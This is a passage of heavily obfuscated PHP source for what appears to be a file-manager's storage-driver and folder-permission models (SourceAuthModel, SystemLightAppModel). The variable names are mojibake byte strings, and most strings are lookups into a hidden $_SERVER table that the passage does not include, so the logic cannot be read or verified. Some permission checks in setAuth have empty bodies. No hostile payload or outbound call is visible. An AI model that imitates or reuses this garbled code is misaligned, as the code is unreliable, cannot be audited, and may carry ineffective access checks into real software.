®ËÇ[0]; if ($Œì ®ËÇ) { $Œì ®ËÇ[$×İ»Ä¢º[6]] = json_decode($Œì ®ËÇ[$×İ»Ä¢º[6]], !0); } return $Œì ®ËÇ; } public function driverInfo($ÕèÁÅ¹Í) { $¼ÖœÔ  =& $_SERVER[Ó¡Ÿ§‚]; $¬’İÔÂõ = array_to_keyvalue(parent::listData(), $¼ÖœÔ [399]); if (!isset($¬’İÔÂõ[$ÕèÁÅ¹Í])) { return !1; } $”‹×Ç• = $¬’İÔÂõ[$ÕèÁÅ¹Í]; $”‹×Ç•[$¼ÖœÔ [6]] = json_decode($”‹×Ç•[$¼ÖœÔ [6]], !0); return $”‹×Ç•; } public function remove($¦¸Ôóğº) { $this->removeShareItems($¦¸Ôóğº); return parent::remove($¦¸Ôóğº); } public function removeWithFile($Şè¸ÖšŒ, $¢ÆÛ¥›¾) { $¸œºò =& $_SERVER[Ó¡Ÿ§‚]; $ƒ¨‹ü° = array($¸œºò[816] => $Şè¸ÖšŒ); $ŞªÏ§µ³ = Model($¸œºò[480])->where($ƒ¨‹ü°)->count(); $ÌÌàş¼„ = Model($¸œºò[480])->where($ƒ¨‹ü°)->sum($¸œºò[76]); $è¦ã–Ç¹ = $¢ÆÛ¥›¾ . $¸œºò[2182] . $Şè¸ÖšŒ; $èßÑ«Œ = LNG($¢ÆÛ¥›¾ == $¸œºò[557] ? $¸œºò[2183] : $¸œºò[2184]); $· ŠÄ× = new TaskFileTransfer($è¦ã–Ç¹, $¸œºò[2178], $ŞªÏ§µ³, $èßÑ«Œ . "\50{$Şè¸ÖšŒ}\x29"); $· ŠÄ×->task[$¸œºò[762]] = (double) $ÌÌàş¼„; $‹ÑÔøë¦ = KodIO::defaultDriver(); $„ûúñÊ÷ = $‹ÑÔøë¦[$¸œºò[399]]; $œœ–“ı = "\x7b\x69\157\72{$„ûúñÊ÷}\175\57"; $…Ûéû¹º = !0; $ÏşÑÓÏ· = array(); $…œ¶¦ = Model($¸œºò[200])->where($ƒ¨‹ü°)->field($¸œºò[2185])->select(); foreach ($…œ¶¦ as $œÓä’‚å) { $ïääœ– = $œÓä’‚å[$¸œºò[84]]; $èÊ³Áöï = $œœ–“ı . str_replace("\173\151\157\72{$Şè¸ÖšŒ}\175\x2f", $¸œºò[12], $ïääœ–); if (!IO::exist($ïääœ–)) { $ÏşÑÓÏ·[] = $œÓä’‚å[$¸œºò[477]]; $· ŠÄ×->updateFileEnd($œÓä’‚å[$¸œºò[32]], $œÓä’‚å[$¸œºò[76]]); continue; } if (IO::exist($èÊ³Áöï)) { $· ŠÄ×->updateFileEnd($œÓä’‚å[$¸œºò[32]], $œÓä’‚å[$¸œºò[76]]); continue; } if (!IO::move($ïääœ–, get_path_father($èÊ³Áöï))) { $…Ûéû¹º = !1; break; } $ƒ¨‹ü° = array($¸œºò[477] => $œÓä’‚å[$¸œºò[477]]); $‚êŒ½ŸÀ = array($¸œºò[816] => $„ûúñÊ÷, $¸œºò[84] => $èÊ³Áöï); Model($¸œºò[200])->where($ƒ¨‹ü°)->save($‚êŒ½ŸÀ); } $this->removeByFileID($ÏşÑÓÏ·); if (!$…Ûéû¹º) { $· ŠÄ×->stop($è¦ã–Ç¹); return !1; } $· ŠÄ×->end(); if ($¢ÆÛ¥›¾ == $¸œºò[1823]) { $this->remove($Şè¸ÖšŒ); } } public function progress($÷À–Æ£, $Õ¬»¶›è) { return Task::get($Õ¬»¶›è . $_SERVER[Ó¡Ÿ§‚][2182] . $÷À–Æ£); } private function removeByFileID($©şò”ã = array()) { $ëå©ØÑ¢ =& $_SERVER[Ó¡Ÿ§‚]; if (empty($©şò”ã)) { return; } $Ì¯ÆóŒ = array($ëå©ØÑ¢[477] => array($ëå©ØÑ¢[7], $©şò”ã)); $™Àêä¨Æ = Model($ëå©ØÑ¢[1338])->where($Ì¯ÆóŒ)->field($ëå©ØÑ¢[411])->select(); if (!$™Àêä¨Æ) { return; } $™Àêä¨Æ = array_to_keyvalue($™Àêä¨Æ, $ëå©ØÑ¢[12], $ëå©ØÑ¢[411]); foreach ($™Àêä¨Æ as $Š²Ù÷À¢) { Model($ëå©ØÑ¢[425])->removeNow($Š²Ù÷À¢, !1); } } private function removeShareItems($¸ºÁéÙ„) { $ƒÙ†ïˆ =& $_SERVER[Ó¡Ÿ§‚]; $áÙÉ„ÙÔ = "\173\x69\x6f\72{$¸ºÁéÙ„}\x7d\x2f"; $À¨‰åÙ = array($ƒÙ†ïˆ[411] => 0, $ƒÙ†ïˆ[1174] => array($ƒÙ†ïˆ[383], "{$áÙÉ„ÙÔ}\x25")); $¤é„Õß = Model($ƒÙ†ïˆ[1834])->where($À¨‰åÙ)->field($ƒÙ†ïˆ[602])->select(); if (empty($¤é„Õß)) { return; } $Æ·œ»Û = array_to_keyvalue($¤é„Õß, $ƒÙ†ïˆ[12], $ƒÙ†ïˆ[602]); Model($ƒÙ†ïˆ[601])->remove($Æ·œ»Û); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x4c\x69\147\x68\x74\x41\x70\160"; public $modelType = "\123\171\x73\164\145\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\147\162\x6f\x75\x70", "\144\x65\x73\x63", "\x63\157\156\x74\145\x6e\x74"); public function listData($ø’ÑŞôä = false, $ÜÌÄâ½§ = "\155\157\144\x69\146\x79\x54\x69\x6d\x65", $ë¬è½Ö² = true) { return parent::listData($ø’ÑŞôä, $ÜÌÄâ½§, $ë¬è½Ö²); } public function remove($üÅ’©¹ï) { $±€£¤×‹ = $this->findByName($üÅ’©¹ï); if (!$±€£¤×‹) { return !1; } return parent::remove($±€£¤×‹[$_SERVER[Ó¡Ÿ§‚][399]]); } public function add($Ç‘˜¥ß) { if ($this->findByName($Ç‘˜¥ß[$_SERVER[Ó¡Ÿ§‚][32]])) { return !1; } return parent::insert($Ç‘˜¥ß); } public function update($¯÷àÊêç, $áÔŸ´Òú) { $ÚİœÔá• =& $_SERVER[Ó¡Ÿ§‚]; $‡×ƒÁ”ó = $this->findByName($¯÷àÊêç); $Í¢ÊÇ„Ù = $this->findByName($áÔŸ´Òú[$ÚİœÔá•[32]]); if (!$‡×ƒÁ”ó || $Í¢ÊÇ„Ù && $Í¢ÊÇ„Ù[$ÚİœÔá•[399]] != $‡×ƒÁ”ó[$ÚİœÔá•[399]]) { return !1; } return parent::update($‡×ƒÁ”ó[$ÚİœÔá•[399]], $áÔŸ´Òú); } } goto e©§İŒÛÉ; aì³¼Æï: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\x65\x5f\141\x75\x74\x68"; public function getAuth($­æ‹ß’ü) { $Â¬Ù›úâ =& $_SERVER[Ó¡Ÿ§‚]; $ÒŠàÔÈ… = $this->sourceAuthSelect($­æ‹ß’ü); $ Šô”çš = array(); $¸óÓÆ = array(); $ÅÔºİùÓ = 2 << 25; foreach ($ÒŠàÔÈ… as $£šÌŞš¿) { $Ç‡’ê£ = Model($Â¬Ù›úâ[507])->listData($£šÌŞš¿[$Â¬Ù›úâ[1958]]); if (!$Ç‡’ê£) { continue; } $ Šô”çš[] = $£šÌŞš¿; $ÖÔ‡ÔÅ = 0; if ($£šÌŞš¿[$Â¬Ù›úâ[420]] == SourceModel::TYPE_GROUP) { $ÖÔ‡ÔÅ = $ÅÔºİùÓ * 2; } if ($£šÌŞš¿[$Â¬Ù›úâ[420]] == SourceModel::TYPE_USER) { $ÖÔ‡ÔÅ = $ÅÔºİùÓ; } if ($£šÌŞš¿[$Â¬Ù›úâ[420]] == SourceModel::TYPE_USER && $£šÌŞš¿[$Â¬Ù›úâ[505]] == $Â¬Ù›úâ[198]) { $ÖÔ‡ÔÅ = 0; } $¸óÓÆ[] = $Ç‡’ê£[$Â¬Ù›úâ[422]] + $ÖÔ‡ÔÅ; } array_multisort($¸óÓÆ, SORT_DESC, $ Šô”çš); return $ Šô”çš; } public function sourceAuthSelect($â¡¡Àçµ) { $¦àãÈ÷› =& $_SERVER[Ó¡Ÿ§‚]; static $ÄŞõùœÔ = array(); $Ôºš¬¯£ = is_array($â¡¡Àçµ) ? !1 : !0; if ($Ôºš¬¯£) { $â¡¡Àçµ = array($â¡¡Àçµ); } $µÂ­©™– = array(); foreach ($â¡¡Àçµ as $ú¬í”Õë) { if (isset($ÄŞõùœÔ[$ú¬í”Õë])) { $µÂ­©™–[$ú¬í”Õë] = $ÄŞõùœÔ[$ú¬í”Õë]; } } if (count($µÂ­©™–) == count($â¡¡Àçµ)) { return $Ôºš¬¯£ ? $µÂ­©™–[$â¡¡Àçµ[0]] : $µÂ­©™–; } $ŒÒïÌßå = $¦àãÈ÷›[2035]; $‘¿İ‚ÍÉ = array($¦àãÈ÷›[411] => array($¦àãÈ÷›[7], $â¡¡Àçµ)); $Ş¸ªå„ = $this->field($ŒÒïÌßå)->order($¦àãÈ÷›[399])->where($‘¿İ‚ÍÉ)->select(); $Æª–É­ = array_to_keyvalue_group($Ş¸ªå„, $¦àãÈ÷›[411]); foreach ($â¡¡Àçµ as $ú¬í”Õë) { $ÄŞõùœÔ[$ú¬í”Õë] = $Æª–É­[$ú¬í”Õë] ? $Æª–É­[$ú¬í”Õë] : array(); } if ($Ôºš¬¯£) { return $Ş¸ªå„; } return $Æª–É­; } public function setAuth($İé’·¸, $ö–€Æ¿Ö) { $ÄÃòû°İ =& $_SERVER[Ó¡Ÿ§‚]; $òò´Ä•ß = Model($ÄÃòû°İ[1338])->sourceInfo($İé’·¸); if (!$òò´Ä•ß) { return !1; } if ($òò´Ä•ß[$ÄÃòû°İ[420]] != SourceModel::TYPE_GROUP) { return !1; } $Ö½®Íß‘ = 1; $î€öìÙí = $òò´Ä•ß[$ÄÃòû°İ[505]]; if ($î€öìÙí != $Ö½®Íß‘) { $˜÷¨Ÿ€ = array($ÄÃòû°İ[1854] => $î€öìÙí); $òëŒ§ƒ = Model($ÄÃòû°İ[1944])->field($ÄÃòû°İ[1665])->where($˜÷¨Ÿ€)->select(); $òëŒ§ƒ = array_to_keyvalue($òëŒ§ƒ, $ÄÃòû°İ[12], $ÄÃòû°İ[1665]); } $Äù¨Ö´… = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ì€õ¤³­ = array(); foreach ($ö–€Æ¿Ö as $ËÀ’¤–) { if (!in_array($ËÀ’¤–[$ÄÃòû°İ[420]], $Äù¨Ö´…)) { show_json(LNG($ÄÃòû°İ[2036]), !1); } if ($î€öìÙí != $Ö½®Íß‘) { if ($ËÀ’¤–[$ÄÃòû°İ[420]] == SourceModel::TYPE_GROUP) { } if ($ËÀ’¤–[$ÄÃòû°İ[505]] != 0 && !in_array($ËÀ’¤–[$ÄÃòû°İ[505]], $òëŒ§ƒ)) { } } if ($ËÀ’¤–[$ÄÃòû°İ[505]] == 0) { $ËÀ’¤–[$ÄÃòû°İ[420]] = SourceModel::TYPE_USER; } $ì€õ¤³­[] = array($ÄÃòû°İ[411] => $İé’·¸, $ÄÃòû°İ[420] => intval($ËÀ’¤–[$ÄÃòû°İ[420]]), $ÄÃòû°İ[505] => intval($ËÀ’¤–[$ÄÃòû°İ[505]]), $ÄÃòû°İ[1958] => intval($ËÀ’¤–[$ÄÃòû°İ[1958]]) ? intval($ËÀ’¤–[$ÄÃòû°İ[1958]]) : 0, $ÄÃòû°İ[2018] => intval($ËÀ’¤–[$ÄÃòû°İ[2018]]) ? intval($ËÀ’¤–[$ÄÃòû°İ[2018]]) : -1); } $this->where(array($ÄÃòû°İ[426] => $İé’·¸))->delete(); $this->addAll($ì€õ¤³­); return !0; } public function authClear($Åş“¾¥­) { $­™ä¯É× =& $_SERVER[Ó¡Ÿ§‚]; $Áô­ÎÇ¬ = Model($­™ä¯É×[1338])->sourceInfo($Åş“¾¥­); $Š‡…Ç± = array($Åş“¾¥­); if ($Áô­ÎÇ¬[$­™ä¯É×[419]] == $­™ä¯É×[88]) { $Øƒìı—â = array($­™ä¯É×[589] => array($­™ä¯É×[549], $Áô­ÎÇ¬[$­™ä¯É×[520]] . $Åş“¾¥­ . $­™ä¯É×[550])); $Š‡…Ç± = Model($­™ä¯É×[1338])->field($­™ä¯É×[426])->where($Øƒìı—â)->getField($­™ä¯É×[411], !0); $Š‡…Ç±[] = $Åş“¾¥­; } $this->where(array($­™ä¯É×[426] => array($­™ä¯É×[427], $Š‡…Ç±)))->delete(); return !0; } public function getAllChildren($œÎ¢¾Â) { $¢¦ªÁ…– =& $_SERVER[Ó¡Ÿ§‚]; $ ”½„³¬ = Model($¢¦ªÁ…–[1338])->sourceInfo($œÎ¢¾Â); if ($ ”½„³¬[$¢¦ªÁ…–[419]] != $¢¦ªÁ…–[88]) { return $this->sourceListAuth(array($œÎ¢¾Â)); } if ($ ”½„³¬[$¢¦ªÁ…–[420]] != SourceModel::TYPE_GROUP) { return array(); } $ĞØëôšÆ = 1; $½éÑ¦­Û = array($œÎ¢¾Â); if ($ ”½„³¬[$¢¦ªÁ…–[441]] == $¢¦ªÁ…–[198] && $ ”½„³¬[$¢¦ªÁ…–[505]] != $ĞØëôšÆ) { $½éÑ¦­Û = $this->groupChidldAllRootSource($ ”½„³¬[$¢¦ªÁ…–[505]]); } $³¶ÛÉÒá = $this->field($¢¦ªÁ…–[411])->group($¢¦ªÁ…–[411])->select(); $³¶ÛÉÒá = array_to_keyvalue($³¶ÛÉÒá, $¢¦ªÁ…–[12], $¢¦ªÁ…–[411]); if (!$³¶ÛÉÒá) { return array(); } $·àœıç™ = $¢¦ªÁ…–[2037]; $«‘Ã‹²É = array($¢¦ªÁ…–[411] => array($¢¦ªÁ…–[7], $³¶ÛÉÒá), $¢¦ªÁ…–[440] => $¢¦ªÁ…–[198]); $È˜æ½¿ = Model($¢¦ªÁ…–[824])->field($·àœıç™)->where($«‘Ã‹²É)->select(); $£û³Ê‘ı = array($œÎ¢¾Â); foreach ($È˜æ½¿ as $ûÑœíÄ) { foreach ($½éÑ¦­Û as $€ç—Óï) { $ÂÅ÷¯Œ© = $¢¦ªÁ…–[50] . $€ç—Óï . $¢¦ªÁ…–[50]; $õà½ùÒ· = $ûÑœíÄ[$¢¦ªÁ…–[520]] . $ûÑœíÄ[$¢¦ªÁ…–[411]] . $¢¦ªÁ…–[50]; if (strstr($õà½ùÒ·, $ÂÅ÷¯Œ©)) { $£û³Ê‘ı[] = $ûÑœíÄ[$¢¦ªÁ…–[411]]; break; } } } return $this->sourceListAuth($£û³Ê‘ı); } private function sourceListAuth($‹’ÜµÌí) { $ëéÊÛş =& $_SERVER[Ó¡Ÿ§‚]; $ıß€†úî = Model($ëéÊÛş[1338])->sourceListInfo($‹’ÜµÌí, !0); $£æ¿¿ì” = $this->sourceAuthSelect($‹’ÜµÌí); $¼Ş€ÎÎÂ = array(); $Ş±„¥ÁÚ = array(); foreach ($ıß€†úî as $ŸÒØĞÚá) { unset($ŸÒØĞÚá[$ëéÊÛş[465]]); unset($ŸÒØĞÚá[$ëéÊÛş[463]]); unset($ŸÒØĞÚá[$ëéÊÛş[422]]); unset($ŸÒØĞÚá[$ëéÊÛş[87]]); $Äû ¿­Ç = $£æ¿¿ì”[$ŸÒØĞÚá[$ëéÊÛş[411]]]; if (!$Äû ¿­Ç) { continue; } $ŸÒØĞÚá[$ëéÊÛş[2038]] = $this->authTargetInfo($Äû ¿­Ç); $ŸÒØĞÚá[$ëéÊÛş[518]] = rtrim($ŸÒØĞÚá[$ëéÊÛş[524]], $ëéÊÛş[8]) . $ëéÊÛş[8] . ltrim($ŸÒØĞÚá[$ëéÊÛş[518]], $ëéÊÛş[8]); $¼Ş€ÎÎÂ[] = $ŸÒØĞÚá; $Î³¼Ñ­Ô = count(explode($ëéÊÛş[8], trim($ŸÒØĞÚá[$ëéÊÛş[518]], $ëéÊÛş[8]))); $Ş±„¥ÁÚ[] = $Î³¼Ñ­Ô + ($ŸÒØĞÚá[$ëéÊÛş[33]] == $ëéÊÛş[75] ? 0 : 1000); } array_multisort($Ş±„¥ÁÚ, SORT_ASC, $¼Ş€ÎÎÂ); return $¼Ş€ÎÎÂ; } private function groupChidldAllRootSource($¢æÄÊú) { $ô‰ş¶”÷ =& $_SERVER[Ó¡Ÿ§‚]; $©£ñÑ²é = Model($ô‰ş¶”÷[2039])->groupChildrenAll($¢æÄÊú); $±¢ƒ…•± = array($ô‰ş¶”÷[441] => 0, $ô‰ş¶”÷[505] => array($ô‰ş¶”÷[7], $©£ñÑ²é), $ô‰ş¶”÷[420] => SourceModel::TYPE_GROUP); $÷öÂ²‘Î = Model($ô‰ş¶”÷[824])->field($ô‰ş¶”÷[411])->where($±¢ƒ…•±)->select(); $÷öÂ²‘Î = array_to_keyvalue($÷öÂ²‘Î, $ô‰ş¶”÷[12], $ô‰ş¶”÷[411]); return $÷öÂ²‘Î; } private function authTargetInfo($ç‚Îä) { $…º ¯æã =& $_SERVER[Ó¡Ÿ§‚]; $…µµŸÑÍ = array(); $¶Ø¬¥± = array(); $Ÿ¡ÕŠÃŒ = 2 << 25; foreach ($ç‚Îä as $ƒ¸â”š‹) { $ œº£â = Model($…º ¯æã[507])->listData($ƒ¸â”š‹[$…º ¯æã[1958]]); if (!$ œº£â) { continue; } if ($ƒ¸â”š‹[$…º ¯æã[420]] == SourceModel::TYPE_USER) { $‰«¸– = Model($…º ¯æã[513])->getInfoSimpleOuter($ƒ¸â”š‹[$…º ¯æã[505]]); if ($‰«¸–[$…º ¯æã[1665]] == $…º ¯æã[1187]) { continue; } if ($‰«¸–[$…º ¯æã[1665]] == $…º ¯æã[198]) { $‰«¸–[$…º ¯æã[32]] = LNG($…º ¯æã[2040]); } } else { $‰«¸– = Model($…º ¯æã[521])->getInfoSimple($ƒ¸â”š‹[$…º ¯æã[505]]); } if (!$‰«¸–) { continue; } $‰«¸–[$…º ¯æã[476]] = $ œº£â; $…µµŸÑÍ[] = $‰«¸–; $‘ÌÌ›ëŒ = 0; if ($ƒ¸â”š‹[$…º ¯æã[420]] == SourceModel::TYPE_GROUP) { $‘ÌÌ›ëŒ = $Ÿ¡ÕŠÃŒ * 2; } if ($ƒ¸â”š‹[$…º ¯æã[420]] == SourceModel::TYPE_USER) { $‘ÌÌ›ëŒ = $Ÿ¡ÕŠÃŒ; } if ($ƒ¸â”š‹[$…º ¯æã[420]] == SourceModel::TYPE_USER && $ƒ¸â”š‹[$…º ¯æã[505]] == $…º ¯æã[198]) { $‘ÌÌ›ëŒ = 0; } $¶Ø¬¥±[] = $ œº£â[$…º ¯æã[422]] + $‘ÌÌ›ëŒ; } array_multisort($¶Ø¬¥±, SORT_DESC, $…µµŸÑÍ); return $…µµŸÑÍ; } public function getAllChildrenByUser($Ş–×Îş©, $äË Ş) { $€’Ë‹’ù =& $_SERVER[Ó¡Ÿ§‚]; $—Š‡ïêá = Model($€’Ë‹’ù[534])->getInfo($äË Ş); if (!$äË Ş || !$Ş–×Îş© || !$—Š‡ïêá) { return array(); } $‡êÁ±ÅŸ = Model($€’Ë‹’ù[1338])->sourceInfo($Ş–×Îş©); $ÚáÁÃ¹ˆ = array(); $Ìù±»‹ = 1; if ($‡êÁ±ÅŸ[$€’Ë‹’ù[441]] == $€’Ë‹’ù[198] && $‡êÁ±ÅŸ[$€’Ë‹’ù[505]] != $Ìù±»‹ && $this->groupContainUser($‡êÁ±ÅŸ[$€’Ë‹’ù[505]], $äË Ş)) { foreach ($—Š‡ïêá[$€’Ë‹’ù[2041]] as $ÛÖ•ÛÎÜ) { $áá´Àç’ = Model($€’Ë‹’ù[521])->getInfo($ÛÖ•ÛÎÜ[$€’Ë‹’ù[1854]]); $‚Íâƒáñ = Model($€’Ë‹’ù[534])->getInfoSimpleOuter($äË Ş); $‚Íâƒáñ[$€’Ë‹’ù[476]] = $ÛÖ•ÛÎÜ[$€’Ë‹’ù[422]]; if (Model($€’Ë‹’ù[507])->authCheckAction($ÛÖ•ÛÎÜ[$€’Ë‹’ù[422]][$€’Ë‹’ù[422]], $€’Ë‹’ù[1875])) { continue; } $ó¦½ĞÄª = array($€’Ë‹’ù[32] => $€’Ë‹’ù[1207] . $áá´Àç’[$€’Ë‹’ù[32]], $€’Ë‹’ù[411] => $áá´Àç’[$€’Ë‹’ù[87]][$€’Ë‹’ù[411]], $€’Ë‹’ù[84] => KodIO::make($áá´Àç’[$€’Ë‹’ù[87]][$€’Ë‹’ù[411]]), $€’Ë‹’ù[441] => $€’Ë‹’ù[198], $€’Ë‹’ù[420] => $€’Ë‹’ù[514], $€’Ë‹’ù[33] => $€’Ë‹’ù[553], $€’Ë‹’ù[518] => $áá´Àç’[$€’Ë‹’ù[525]], $€’Ë‹’ù[1854] => $áá´Àç’[$€’Ë‹’ù[1854]], $€’Ë‹’ù[522] => $áá´Àç’[$€’Ë‹’ù[441]], $€’Ë‹’ù[2038] => array($‚Íâƒáñ)); $ÚáÁÃ¹ˆ[$ó¦½ĞÄª[$€’Ë‹’ù[411]]] = $ó¦½ĞÄª; } } $¬¯¸¦á‹ = array(); $Ğº€Õ–‡ = $this->getAllChildren($Ş–×Îş©); foreach ($Ğº€Õ–‡ as $æá²ßì) { $»«±ñ¡¾ = !1; foreach ($æá²ßì[$€’Ë‹’ù[2038]] as $·ÁÏÏÎÌ) { if ($·ÁÏÏÎÌ[$€’Ë‹’ù[1665]]) { if ($·ÁÏÏÎÌ[$€’Ë‹’ù[1665]] == $äË Ş) { $»«±ñ¡¾ = !0; break; } } if ($·ÁÏÏÎÌ[$€’Ë‹’ù[1854]]) { if ($this->groupContainUser($·ÁÏÏÎÌ[$€’Ë‹’ù[1854]], $äË Ş)) { $»«±ñ¡¾ = !0; break; } } } if ($»«±ñ¡¾) { $¬¯¸¦á‹[] = $æá²ßì; } $•ùÓ ¶Ø = $æá²ßì[$€’Ë‹’ù[411]]; if (isset($ÚáÁÃ¹ˆ[$•ùÓ ¶Ø])) { $æá²ßì[$€’Ë‹’ù[2038]][] = $ÚáÁÃ¹ˆ[$•ùÓ ¶Ø][0]; $ÚáÁÃ¹ˆ[$•ùÓ ¶Ø] = !1; } } $ÚáÁÃ¹ˆ = array_filter(array_values($ÚáÁÃ¹ˆ)); $¬¯¸¦á‹ = array_merge($ÚáÁÃ¹ˆ, $¬¯¸¦á‹); return $¬¯¸¦á‹; } public function setAllChildrenByUser($Ã˜­ıå, $«ñÈãåî, $¼×Œ¨Ë·) { $Ë“ö¿®¿ =& $_SERVER[Ó¡Ÿ§‚]; $Ò£™ÕË = $this->getAllChildrenByUser($Ã˜­ıå, $«ñÈãåî); if (!$¼×Œ¨Ë· || !$Ò£™ÕË) { return !1; } foreach ($Ò£™ÕË as $ ãÂ†Ä») { $Ïìü¶†° = array(); foreach ($ ãÂ†Ä»[$Ë“ö¿®¿[2038]] as $š•–ˆ€„) { $òß»¹ÏÍ = $š•–ˆ€„[$Ë“ö¿®¿[476]]; $»Ôîƒ÷Ğ = $š•–ˆ€„[$Ë“ö¿®¿[1665]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $«€›¶€¿ = $š•–ˆ€„[$Ë“ö¿®¿[1665]] ? $š•–ˆ€„[$Ë“ö¿®¿[1665]] : $š•–ˆ€„[$Ë“ö¿®¿[1854]]; if ($š•–ˆ€„[$Ë“ö¿®¿[1665]] && $š•–ˆ€„[$Ë“ö¿®¿[1665]] == $«ñÈãåî) { continue; } $Ïìü¶†°[] = array($Ë“ö¿®¿[411] => $ ãÂ†Ä»[$Ë“ö¿®¿[411]], $Ë“ö¿®¿[420] => $»Ôîƒ÷Ğ, $Ë“ö¿®¿[505] => intval($«€›¶€¿), $Ë“ö¿®¿[1958] => isset($òß»¹ÏÍ[$Ë“ö¿®¿[399]]) ? intval($òß»¹ÏÍ[$Ë“ö¿®¿[399]]) : 0, $Ë“ö¿®¿[2018] => isset($òß»¹ÏÍ[$Ë“ö¿®¿[2018]]) ? intval($òß»¹ÏÍ[$Ë“ö¿®¿[2018]]) : -1); } $Ïìü¶†°[] = array($Ë“ö¿®¿[411] => $ ãÂ†Ä»[$Ë“ö¿®¿[411]], $Ë“ö¿®¿[420] => SourceModel::TYPE_USER, $Ë“ö¿®¿[505] => intval($«ñÈãåî), $Ë“ö¿®¿[1958] => intval($¼×Œ¨Ë·), $Ë“ö¿®¿[2018] => -1); $this->where(array($Ë“ö¿®¿[426] => $ ãÂ†Ä»[$Ë“ö¿®¿[411]]))->delete(); $this->addAll($Ïìü¶†°); } return !0; } public function get($ºÖ‰›Œæ) { $Á˜Šıûâ = $this->getSourceList(array($ºÖ‰›Œæ), !0); return $Á˜Šıûâ[0]; } public function getSourceList($•ÉÕË, $¸øü¢©Í = false, $ó€ô­Ë¨ = false) { $í÷œÚÁ¨ =& $_SERVER[Ó¡Ÿ§‚]; if (!$•ÉÕË) { return array(); } $‹Š©Ôòú = Model($í÷œÚÁ¨[1338]); if (!$¸øü¢©Í && count($•ÉÕË) == 1) { $¸øü¢©Í = array(); $¸øü¢©Í[$•ÉÕË[0]] = $‹Š©Ôòú->sourceInfo($•ÉÕË[0]); } if (!$¸øü¢©Í) { $ğßä•şå = array($í÷œÚÁ¨[426] => array($í÷œÚÁ¨[427], $•ÉÕË)); $¸øü¢©Í = $‹Š©Ôòú->field($í÷œÚÁ¨[2042])->where($ğßä•şå)->select(); $¸øü¢©Í = array_to_keyvalue($¸øü¢©Í, $í÷œÚÁ¨[411]); } $Óô‹šæ = $•ÉÕË; foreach ($¸øü¢©Í as $—˜Å­úš => $ô¤ë˜·¦) { $¯½ÎÎ­ä = $‹Š©Ôòú->parentLevelArray($ô¤ë˜·¦[$í÷œÚÁ¨[520]]); $Óô‹šæ = array_merge($Óô‹šæ, array($—˜Å­úš), array_reverse($¯½ÎÎ­ä)); } $Óô‹šæ = array_values(array_unique($Óô‹šæ)); if (!$Óô‹šæ) { return array(); } $êÖ±ûƒè = $this->sourceAuthSelect($Óô‹šæ); $¼×±îÜ™ = array(); foreach ($Óô‹šæ as $ÈÁıé¾€) { if (isset($êÖ±ûƒè[$ÈÁıé¾€])) { $¼×±îÜ™[$ÈÁıé¾€] = $êÖ±ûƒè[$ÈÁıé¾€]; } } $Ö¯¼«„ß = $this->userIsRoot($ó€ô­Ë¨); $Ïš µäí = AuthModel::authAll(); $½ª¯Íªé = array($í÷œÚÁ¨[423] => $Ïš µäí, $í÷œÚÁ¨[2043] => array($í÷œÚÁ¨[428] => 0, $í÷œÚÁ¨[1860] => $Ïš µäí, $í÷œÚÁ¨[429] => LNG($í÷œÚÁ¨[2044]), $í÷œÚÁ¨[1877] => $í÷œÚÁ¨[2045])); $ÕŠªîİ = array(); foreach ($¸øü¢©Í as $ÈÁıé¾€ => $ñò¼ÛÏ) { if ($Ö¯¼«„ß && $GLOBALS[$í÷œÚÁ¨[6]][$í÷œÚÁ¨[1873]]) { $ÕŠªîİ[$ÈÁıé¾€] = $½ª¯Íªé; continue; } $ÕŠªîİ[$ÈÁıé¾€] = $this->makeSourceAuth($ñò¼ÛÏ, $¼×±îÜ™, $ó€ô­Ë¨); } return $ÕŠªîİ; } public function authDeepCheck($…‹Ã¥à, $æ€ô Í = false) { $ÖÈøÉí® =& $_SERVER[Ó¡Ÿ§‚]; $æ€ô Í = $æ€ô Í ? $æ€ô Í : USER_ID; $³£æ»©Ø = $this->makeAuthDeep($æ€ô Í); if (!in_array($…‹Ã¥à, $³£æ»©Ø[$ÖÈøÉí®[2046]])) { return !1; } $´èÏ”Ñ = array(); foreach ($³£æ»©Ø[$ÖÈøÉí®[2047]] as $­ìÊÃÎÄ => $Œ­ı÷‹) { if (!in_array($…‹Ã¥à, $Œ­ı÷‹)) { continue; } $´èÏ”Ñ[] = $­ìÊÃÎÄ; } if (!$´èÏ”Ñ) { return !1; } $Ç°¢ù× = $´èÏ”Ñ ? $´èÏ”Ñ[0] : $…‹Ã¥à; return array($ÖÈøÉí®[423] => -1, $ÖÈøÉí®[476] => array($ÖÈøÉí®[428] => $ÖÈøÉí®[1187], $ÖÈøÉí®[1860] => $ÖÈøÉí®[198], $ÖÈøÉí®[429] => LNG($ÖÈøÉí®[2048]), $ÖÈøÉí®[1877] => $ÖÈøÉí®[2049]), $ÖÈøÉí®[2050] => LNG($ÖÈøÉí®[2051]), $ÖÈøÉí®[2052] => $this->sourceAuthInfo($Ç°¢ù×)); } protected function makeAuthDeep($è’ªúñî = false) { $™Î¡³ß =& $_SERVER[Ó¡Ÿ§‚]; static $í…â¥ù = array(); $è’ªúñî = $è’ªúñî ? $è’ªúñî : USER_ID; if (isset($í…â¥ù[$è’ªúñî])) { return $í…â¥ù[$è’ªúñî]; } $î¢ÚÒ = Model($™Î¡³ß[2053])->listData(); $Ğ˜õÜ Ì = array(); foreach ($î¢ÚÒ as $ÊùÒö»ú) { if ($ÊùÒö»ú[$™Î¡³ß[422]] == 0 && $ÊùÒö»ú[$™Î¡³ß[1876]] == $™Î¡³ß[88]) { $Ğ˜õÜ Ì[] = $ÊùÒö»ú[$™Î¡³ß[399]]; } } $Ù—»¡¦ø = $this->userGroupParents($è’ªúñî); $Îí€Ïòâ = array($™Î¡³ß[420] => SourceModel::TYPE_USER, $™Î¡³ß[505] => $è’ªúñî); if ($Ù—»¡¦ø) { $Îí€Ïòâ = array(array($™Î¡³ß[420] => SourceModel::TYPE_USER, $™Î¡³ß[505] => $è’ªúñî), array($™Î¡³ß[420] => SourceModel::TYPE_GROUP, $™Î¡³ß[505] => array($™Î¡³ß[427], $Ù—»¡¦ø)), $™Î¡³ß[999] => $™Î¡³ß[1952]); } $æíŠÌªª = $this->field($™Î¡³ß[2054])->where($Îí€Ïòâ)->select(); $›±œé¯ƒ = array(); $Á‰Ã±«­ = 